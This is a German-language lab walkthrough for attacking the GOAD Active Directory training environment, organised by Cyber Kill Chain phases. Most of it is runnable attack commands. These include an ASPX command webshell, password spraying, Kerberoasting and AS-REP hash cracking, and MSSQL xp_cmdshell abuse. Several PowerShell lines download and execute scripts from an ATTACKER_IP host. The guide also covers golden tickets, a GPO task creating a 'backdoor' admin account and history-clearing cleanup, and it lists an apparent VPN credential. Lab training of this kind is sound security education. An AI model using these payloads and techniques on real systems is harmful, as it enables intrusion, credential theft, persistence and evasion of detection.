# GOAD Lab Penetration Testing - Ubuntu Setup & Cyber Kill Chain Guide

## Einführung

Diese detaillierte Anleitung führt Sie durch einen **systematischen Penetration Test** des GOAD (Game of Active Directory) Labs von einem Ubuntu-System aus. Die Anleitung orientiert sich strikt an der **Cyber Kill Chain** und berücksichtigt alle spezifischen Schwachstellen und Angriffspfade des GOAD Labs.

---

## Voraussetzungen & VPN-Setup

### 1. VPN-Verbindung herstellen
```bash
# OpenVPN installieren
sudo apt update && sudo apt install openvpn

# VPN-Verbindung etablieren
sudo openvpn /pfad/zur/ovpn/datei.ovpn
# Credentials: Username: 24-6, Passwort: VPNLab2406

# Labor-Netzwerke:
# Lab 1 → 192.168.10.x
# Lab 2 → 192.168.20.x  
# Lab 3 → 192.168.30.x
# Lab 4 → 192.168.40.x
# Lab 5 → 192.168.50.x
```

---

## Phase 1: Reconnaissance - Informationssammlung

### Tool-Installation & Setup

#### Essential Reconnaissance Tools
```bash
# Nmap (Network Discovery & Port Scanning)
sudo apt install nmap

# CrackMapExec (AD Enumeration)
sudo snap install crackmapexec
# Alternative: sudo apt install crackmapexec

# Impacket Suite (Python AD Tools)
sudo apt install impacket-scripts python3-impacket
# Alternative: pip3 install impacket

# Responder (LLMNR/NBT-NS Poisoning)
sudo apt install responder

# PowerView.py (Linux Alternative zu PowerView.ps1)
sudo apt install libkrb5-dev
pip3 install powerview
# Alternative: git clone https://github.com/aniqfakhrul/powerview.py

# evil-winrm (WinRM Shell)
sudo apt install evil-winrm

# Zusätzliche Tools
sudo apt install enum4linux-ng smbclient rpcclient ldap-utils
```

#### BloodHound Community Edition Setup
```bash
# Docker Installation
sudo apt install docker.io docker-compose
sudo systemctl start docker && sudo systemctl enable docker

# BloodHound CE Installation
curl -L https://ghst.ly/getbh | docker-compose up

# Zugriff über: http://127.0.0.1:8080/ui/login
# Default-Login: admin/[generiertes Passwort]
```

### Initial Reconnaissance Commands

#### 1. Netzwerk-Discovery
```bash
# GOAD Lab Target Discovery
nmap -Pn 192.168.10.0/24 -sn                    # Host Discovery
nmap -Pn -sV -sC 192.168.10.10-15 -oA goad_scan # Service Scan
nmap -Pn --script vuln 192.168.10.10-15         # Vulnerability Scan

# UDP Scan für wichtige Services
nmap -Pn -sU --top-ports 1000 192.168.10.10-15
```

#### 2. DNS & Domain Enumeration
```bash
# Domain Information Gathering
nslookup sevenkingdoms.local
nslookup north.sevenkingdoms.local  
nslookup essos.local

# DNS Zone Transfer Versuche
dig @192.168.10.10 sevenkingdoms.local AXFR
dig @192.168.10.11 north.sevenkingdoms.local AXFR
dig @192.168.10.13 essos.local AXFR
```

#### 3. SMB & NetBIOS Enumeration
```bash
# SMB Shares & Hosts Discovery
crackmapexec smb 192.168.10.0/24
crackmapexec smb 192.168.10.0/24 --shares
crackmapexec smb 192.168.10.0/24 --users

# Detaillierte SMB Enumeration
enum4linux-ng 192.168.10.10
smbclient -L //192.168.10.10 -N
```

#### 4. LDAP Enumeration
```bash
# Anonymous LDAP Bind
ldapsearch -x -h 192.168.10.10 -b "DC=sevenkingdoms,DC=local"
ldapsearch -x -h 192.168.10.11 -b "DC=north,DC=sevenkingdoms,DC=local"
ldapsearch -x -h 192.168.10.13 -b "DC=essos,DC=local"

# PowerView.py für detaillierte AD-Enumeration
powerview -t 192.168.10.10 -u guest
Get-DomainUser
Get-DomainGroup  
Get-DomainComputer
Get-DomainGPO
```

---

## Phase 2: Weaponization - Tool-Vorbereitung

### Windows Tool Setup (via Wine)
```bash
# Wine Installation
sudo apt install wine winetricks
winecfg  # Wine konfigurieren

# Windows Pentesting Tools Directory
mkdir ~/goad-tools && cd ~/goad-tools

# Mimikatz Download (Vorsicht - nur für autorisierte Tests)
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip

# Rubeus (Kerberos Attacks)
wget https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe

# SharpHound (BloodHound Data Collection)
wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe
```

### Custom Payloads & Scripts
```bash
# Webshell für ASPX Upload (castelblack IIS)
cat > webshell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (cmd != null)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>
EOF
```

---

## Phase 3: Delivery - Angriffsvektoren

### 1. LLMNR/NBT-NS Poisoning
```bash
# Responder starten (Terminal 1)
sudo responder -I eth0 -rdwv

# Hash-Capture überwachen
tail -f /usr/share/responder/logs/*

# Alternative: Hashcat-kompatible Hashes extrahieren
grep ":::" /usr/share/responder/logs/*.txt > captured_hashes.txt
```

### 2. Kerberoasting Preparation
```bash
# Service Principal Names (SPNs) enumerieren
python3 /usr/share/impacket/examples/GetUserSPNs.py \
  sevenkingdoms.local/guest -dc-ip 192.168.10.10 -no-pass

# Bekannte GOAD SPNs:
# - jon.snow (MSSQL Service)
# - HTTP/castelblack
```

### 3. ASREPRoasting Setup
```bash
# Users ohne Kerberos Pre-Authentication
python3 /usr/share/impacket/examples/GetNPUsers.py \
  sevenkingdoms.local/ -dc-ip 192.168.10.10 -no-pass -usersfile users.txt

# GOAD Target: brandon.stark (NoPreauth aktiviert)
echo "brandon.stark" > asrep_targets.txt
```

---

## Phase 4: Exploitation - Schwachstellen ausnutzen

### 1. Password Attacks

#### Password Spraying
```bash
# User-Liste aus Enumeration
cat > users.txt << EOF
jon.snow
eddard.stark
brandon.stark
arya.stark
sansa.stark
robb.stark
catelyn.stark
rickon.stark
hodor
jeor.mormont
samwell.tarly
EOF

# Common Password Patterns (GOAD-spezifisch)
crackmapexec smb 192.168.10.0/24 -u users.txt -p 'Winter2019' --continue-on-success
crackmapexec smb 192.168.10.0/24 -u users.txt -p 'password' --continue-on-success
crackmapexec smb 192.168.10.0/24 -u hodor -p 'hodor' # User=Password
```

#### ASREPRoasting (brandon.stark)
```bash
# Hash extrahieren
python3 /usr/share/impacket/examples/GetNPUsers.py \
  sevenkingdoms.local/brandon.stark -dc-ip 192.168.10.10 -no-pass

# Mit hashcat cracken
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt --force
```

#### Kerberoasting (jon.snow)
```bash
# Service Tickets extrahieren
python3 /usr/share/impacket/examples/GetUserSPNs.py \
  sevenkingdoms.local/jon.snow:password -dc-ip 192.168.10.10 \
  -outputfile kerberoast_hashes.txt

# Hashcat Kerberoasting
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### 2. GOAD-spezifische Exploits

#### MSSQL Exploitation (castelblack & braavos)
```bash
# MSSQL-Verbindung (jon.snow Admin auf castelblack)
python3 /usr/share/impacket/examples/mssqlclient.py \
  sevenkingdoms.local/jon.snow:password@192.168.10.12

# xp_cmdshell aktivieren
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# Trusted Link Abuse (castelblack → braavos)
SQL> select * from openquery("braavos", 'select @@servername')
SQL> select * from openquery("braavos", 'exec xp_cmdshell "whoami"')
```

#### IIS ASPX Upload (castelblack)
```bash
# File Upload Test
curl -X POST -F "file=@webshell.aspx" \
  http://192.168.10.12/upload/ 

# Command Execution via Webshell
curl "http://192.168.10.12/webshell.aspx?cmd=whoami"
curl "http://192.168.10.12/webshell.aspx?cmd=powershell -enc <BASE64>"
```

### 3. BloodHound Data Collection

#### Linux-basierte Datensammlung
```bash
# bloodhound.py verwenden
pip3 install bloodhound
bloodhound-python -d sevenkingdoms.local -u jon.snow -p password \
  -gc kingslanding.sevenkingdoms.local -c all

# Daten in BloodHound importieren
# Dateien: *_computers.json, *_users.json, *_groups.json, etc.
```

#### Windows SharpHound (falls RCE verfügbar)
```bash
# Via MSSQL xp_cmdshell
SQL> xp_cmdshell "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All\""

# Via WinRM (falls verfügbar)
evil-winrm -i 192.168.10.12 -u jon.snow -p password
*Evil-WinRM* PS> .\SharpHound.exe -c All --zipfilename bloodhound_data.zip
```

---

## Phase 5: Installation - Persistenz etablieren

### 1. Golden Ticket Attack
```bash
# KRBTGT Hash extrahieren (Domain Admin erforderlich)
python3 /usr/share/impacket/examples/secretsdump.py \
  sevenkingdoms.local/administrator:password@192.168.10.10

# Golden Ticket erstellen
python3 /usr/share/impacket/examples/ticketer.py \
  -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-... \
  -domain sevenkingdoms.local administrator

# Ticket verwenden
export KRB5CCNAME=administrator.ccache
python3 /usr/share/impacket/examples/wmiexec.py \
  sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local -k -no-pass
```

### 2. Shadow Credentials Attack
```bash
# Wenn WriteProperty/GenericAll auf User-Objekt
python3 pywhisker.py -d sevenkingdoms.local -u attacker -p password \
  --target khal.drogo --action add --filename shadow_cert.pfx
```

### 3. GPO Abuse (STARKWALLPAPER)
```bash
# Wenn Write-DACL auf GPO vorhanden
# SharpGPOAbuse über Webshell/WinRM ausführen
curl "http://192.168.10.12/webshell.aspx?cmd=.\SharpGPOAbuse.exe --AddComputerTask --TaskName='Backdoor' --Author='BUILTIN\Administrators' --Command='cmd.exe' --Arguments='/c net user backdoor P@ssw0rd /add && net localgroup administrators backdoor /add' --GPOName='STARKWALLPAPER'"
```

---

## Phase 6: Command & Control - Lateral Movement

### 1. Pass-the-Hash
```bash
# Mit gültigen NTLM-Hashes
crackmapexec smb 192.168.10.0/24 -u administrator -H NTLM_HASH --local-auth
crackmapexec smb 192.168.10.10 -u administrator -H NTLM_HASH -x "whoami"
```

### 2. WinRM-basierte Bewegung
```bash
# WinRM-Zugriff testen
crackmapexec winrm 192.168.10.0/24 -u jon.snow -p password

# Interactive Shell
evil-winrm -i 192.168.10.12 -u jon.snow -p password
```

### 3. MSSQL Linked Server Hopping
```bash
# Von castelblack zu braavos
python3 /usr/share/impacket/examples/mssqlclient.py \
  sevenkingdoms.local/jon.snow:password@192.168.10.12

SQL> select * from openquery("braavos", 'exec xp_cmdshell "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP:8000/shell.ps1'')\""')
```

---

## Phase 7: Actions on Objective - Ziele erreichen

### 1. Domain Compromise Validation
```bash
# Domain Admin Hash Dump
python3 /usr/share/impacket/examples/secretsdump.py \
  sevenkingdoms.local/administrator:password@192.168.10.10

# Alle Domain Computer kompromittieren
crackmapexec smb 192.168.10.0/24 -u administrator -H ADMIN_HASH --sam
```

### 2. Cross-Domain/Forest Attacks
```bash
# Trust Enumeration
crackmapexec ldap 192.168.10.10 -u administrator -p password --trusts

# Cross-Forest Golden Tickets
python3 /usr/share/impacket/examples/ticketer.py \
  -nthash KRBTGT_HASH -domain-sid S-1-5-21-... \
  -domain sevenkingdoms.local -extra-sid S-1-5-21-...-519 administrator
```

---

## GOAD-Spezifische Angriffspfade

### Scenario-basierte Exploits

#### 1. Password in SYSVOL (jeor.mormont)
```bash
# SYSVOL Share durchsuchen
smbclient //192.168.10.11/SYSVOL -U jeor.mormont
smb: \> recurse ON
smb: \> prompt OFF  
smb: \> mget *

# GPP-Passwords entschlüsseln
grep -r cpassword *.xml
python3 gpp-decrypt.py ENCRYPTED_PASSWORD
```

#### 2. Unconstrained Delegation (winterfell/castelblack)
```bash
# Delegation prüfen
crackmapexec ldap 192.168.10.10 -u user -p password --trusted-for-delegation

# TGT Capture (wenn System kompromittiert)
# Via Rubeus: .\Rubeus.exe monitor /interval:1
```

#### 3. AdminSDHolder Abuse
```bash
# BloodHound Query: "Find Principals with DCSync Rights"
# Via PowerView: Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
```

---

## Monitoring & Cleanup

### 1. Log-Analyse
```bash
# Responder Logs
ls -la /usr/share/responder/logs/
cat /usr/share/responder/logs/*NTLM*.txt

# CrackMapExec Logs  
ls -la ~/.crackmapexec/logs/
tail -f ~/.crackmapexec/logs/crackmapexec.log
```

### 2. Evidence Cleanup
```bash
# Temporäre Dateien löschen
rm -f *.txt *.ccache *.json *.zip
rm -rf ~/goad-tools/

# History löschen
history -c
unset HISTFILE
```

---

## Troubleshooting

### Häufige Probleme

#### 1. DNS-Resolution Issues
```bash
# Domain Controller zu /etc/hosts hinzufügen
echo "192.168.10.10 kingslanding.sevenkingdoms.local" >> /etc/hosts
echo "192.168.10.11 winterfell.north.sevenkingdoms.local" >> /etc/hosts
echo "192.168.10.13 meereen.essos.local" >> /etc/hosts
```

#### 2. Kerberos-Timing Issues
```bash
# Zeit synchronisieren
sudo ntpdate -s 192.168.10.10
timedatectl set-ntp true
```

#### 3. Tool Compatibility
```bash
# Python-Version prüfen
python3 --version  # Sollte 3.6+ sein

# Impacket-Installation verifizieren
secretsdump.py -h
wmiexec.py -h
```

---

## Reporting & Documentation

### 1. Findings Template
```bash
# Ergebnisse strukturiert dokumentieren
cat > goad_findings.md << 'EOF'
# GOAD Lab Penetration Test - Findings

## Executive Summary
- Vollständige Domain-Kompromittierung erreicht
- X kritische Schwachstellen identifiziert  
- Y Benutzerkonten kompromittiert

## Technical Findings
1. **LLMNR/NBT-NS Poisoning** - Credential Theft
2. **ASREPRoasting** - brandon.stark (CRITICAL)
3. **Kerberoasting** - jon.snow (HIGH)
4. **MSSQL Trusted Links** - Lateral Movement
5. **GPO Write-DACL** - Privilege Escalation

## Attack Chain
Responder → Password Cracking → MSSQL Access → Lateral Movement → Domain Admin

## Recommendations
1. LLMNR/NBT-NS deaktivieren
2. Kerberos Pre-Auth für alle User aktivieren  
3. Service Account Passwords rotieren
4. GPO-Berechtigungen überprüfen
EOF
```

---

## Referenzen & Ressourcen

- **GOAD Official**: https://orange-cyberdefense.github.io/GOAD/
- **Mayfly's GOAD Writeups**: https://mayfly277.github.io/categories/goad/
- **BloodHound Documentation**: https://bloodhound.readthedocs.io/
- **Impacket Examples**: https://github.com/fortra/impacket/tree/master/examples
- **PowerView.py**: https://github.com/aniqfakhrul/powerview.py

---

**⚠️ Wichtiger Hinweis**: Diese Anleitung ist ausschließlich für autorisierte Penetration Tests in kontrollierten Lab-Umgebungen bestimmt. Jede andere Verwendung ist illegal und unethisch.

---

**Tool Versions (Stand August 2025)**:
- Ubuntu 20.04+ LTS
- Impacket 0.12.0+
- BloodHound CE 2.0+
- CrackMapExec 5.4+
- Evil-WinRM 3.7+